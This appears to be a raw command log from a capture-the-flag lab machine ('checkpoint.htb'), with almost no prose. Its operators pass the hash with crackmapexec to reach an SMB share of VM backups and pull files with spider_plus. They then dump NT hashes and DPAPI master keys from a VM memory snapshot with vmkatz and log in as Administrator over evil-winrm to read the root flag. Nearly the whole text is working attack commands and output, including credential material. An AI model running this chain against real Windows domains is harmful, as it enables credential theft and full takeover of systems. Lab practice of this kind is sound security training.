AES128: 4662bace42d72f9cc3fbf3baf4f014e8
RC4: 27c86aa186ebaa55e969a467020adbde

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9

cme smb 10.129.16.146 -H e16081eb077aca74bdbf8af12af43ac9 -u svc_deploy
SMB         10.129.16.146   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.16.146   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9

smbclient '[//10.129.16.146/VMBackups](https://10.129.16.146/VMBackups)' -U 'checkpoint.htb\svc_deploy' --pw-nt-hash --password=e16081eb077aca74bdbf8af12af43ac9 -c 'recurse ON; ls'
.                                   D        0  Sat May  9 13:15:22 2026
..                                  D        0  Sat May  9 10:42:27 2026
NightlyBackup_2024-11-01            D        0  Sat May  9 12:54:19 2026

\NightlyBackup_2024-11-01
.                                   D        0  Sat May  9 12:54:19 2026
..                                  D        0  Sat May  9 13:15:22 2026
memory forensics                    D        0  Sat May  9 13:12:44 2026

\NightlyBackup_2024-11-01\memory forensics
.                                   D        0  Sat May  9 13:12:44 2026
..                                  D        0  Sat May  9 12:54:19 2026
Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 22:45:22 2026
Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 22:40:36 2026
Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 22:40:36 2026
Windows Server 2019.nvram           A   270840  Sat May  9 22:39:00 2026
Windows Server 2019.scoreboard      A     7642  Sat May  9 22:45:22 2026
Windows Server 2019.vmdk            A 10199695360  Sat May  9 22:39:00 2026
Windows Server 2019.vmsd            A      502  Sat May  9 22:39:00 2026
Windows Server 2019.vmx             A     2749  Sat May  9 22:45:22 2026
Windows Server 2019.vmxf            A      274  Sat May  9 22:22:44 2026

```
	10459391 blocks of size 4096. 2447109 blocks available
```

cme smb 10.129.16.146 -H e16081eb077aca74bdbf8af12af43ac9 -u svc_deploy -M spider_plus -o DOWNLOAD_FLAG=true

./vmkatz --disk Windows\ Server\ 2019-000001.vmdk Windows\ Server\ 2019-Snapshot1.vmsn
[*] vmkatz v1.4.1
[*] System discovery: 2.888332974s
[*] Process enumeration: 495.794µs
[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 13.504876ms

[+] 2 logon session(s), 2 with credentials:

LUID: 0x3e4 (NETWORK SERVICE)
Username: WIN-0DG6SJAEUTA$
Domain: WORKGROUP
[DPAPI]
GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e

SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
[DPAPI]
GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d

SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
[DPAPI]
GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718

SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

LUID: 0x14016d
Session: 2 | LogonType: Unknown
Username: Administrator
Domain: WIN-0DG6SJAEUTA
LogonServer: WIN-0DG6SJAEUTA
LogonTime: 2026-05-09 14:07:14 UTC
SID: S-1-5-21-2823729479-30462974-3865623546-500
[MSV1_0]
NT Hash : f29e9c014295b9b32139b09a2790be3b
SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
[DPAPI]
GUID          : c53f7d5b-2902-415c-9c09-251f39974440
MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15

SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

[*] 2 sessions, 1 NT hashes, 0 plaintext passwords

evil-winrm -i 10.129.16.225 -u Administrator -H f29e9c014295b9b32139b09a2790be3b 

*Evil-WinRM* PS C:\Users\max.palmer\Desktop> ls

```
Directory: C:\\Users\\max.palmer\\Desktop
```

Mode                 LastWriteTime         Length Name

---

- ar--- 6/20/2026 3:16 AM 34 root.txt

*Evil-WinRM* PS C:\Users\max.palmer\Desktop> cat root.txt
8e28d40a4dfd5f232105e1818b73bb4e